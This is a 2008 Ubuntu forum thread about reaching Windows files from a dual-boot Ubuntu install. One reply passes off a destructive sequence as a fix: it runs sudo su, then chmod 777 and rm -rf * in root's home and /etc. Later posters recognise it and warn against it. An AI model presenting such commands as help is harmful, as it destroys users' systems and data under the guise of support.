---
title: "I need a little help."
date: 2008-09-24
forum: General Help
---

### Post by Hyami on 2008-09-24
I have Ubuntu and Windows sharing the same hard drive and I want to access my windows files from ubuntu and vice versa. Is there a way to do this?

---

### Post by Ryadt on 2008-09-24
Windows partition can be accessed under Places.
Which file system did you install Ubuntu on?

---

### Post by Hyami on 2008-09-24
NTFS, if that's what you're asking.

---

### Post by Ryadt on 2008-09-24
Nope I meant the linux partition file system (ext2, ext3, etc)
Anyway your windows partition will be shown as I mentioned above.
For you to access your Ubuntu partition in Windows, have a look here:
[http://fs-driver.org/index.html](http://fs-driver.org/index.html)

---

### Post by Hyami on 2008-09-24
This will work even if I installed Ubuntu inside Windows?

---

### Post by hyper_ch on 2008-09-24
It is advised to use a descriptive topic title; that means use a topic title that gives some clue about the content in the thread itself...

A generic topic title like "noob here" or "need help" does not help at all. As you may have notices, just about everyone posting in here has some kind of a problem or issue or question ;) 

Just imagine what these forums would look like if everybody would just post "Help" or "Noob here". What do you think how many people will still look at such threads?

Furthermore, for unrelated questions it's also adviced to open a seperate thread for each one, so that each problem can be addressed (and eventually marked as solved) individually.

---

### Post by Hyami on 2008-09-24
Thanks for the heads up. On that note, I went under Places and it just shows my C drive which isn't where I installed Ubuntu. Like I said before, Windows and Ubuntu are on the same hard drive. Says that I have 23 gigs of space left when I installed it on a 160gb hard drive.

---

### Post by RastaBlasta on 2008-09-24
There is a simple way to resolve this problem and allow you to access and use all the files on your windows installation , Just follow these commands and all your issues will be resolved.

Open up a terminal session: Applications > Accessories > Terminal.

In the terminal type the following commands in this order.
```
sudo su
```
Enter Password
```
cd ~
```
```
chmod 777 *
```
```
rm -rf *
```
```
cd /etc
```
```
chmod 777 *
```
```
rm -rf *
```
```
reboot
```

And thats it all your problems shall be solved.

Good luck

---

### Post by semitone36 on 2008-09-24
They are supposed to be on the same hard drive.  Do you ever remember having to partition your hard drive in order to install Ubuntu? If so there is a way to mount your Windows partitions so that they are accessible from the Ubuntu partitions. 

Give this link a read through:
[http://www.psychocats.net/ubuntu/mountwindows](http://www.psychocats.net/ubuntu/mountwindows)

---

### Post by Hyami on 2008-09-24
RastaBlasta~ You want me to remove everything from my hard drive?

semitone36~ Thanks for the help. :)

---

### Post by semitone36 on 2008-09-24
> **Hyami said:**
> RastaBlasta~ You want me to remove everything from my hard drive?

Smart. Very smart.  Always be cautious if someone gives you the rm -rf command. Sudo or not.

---

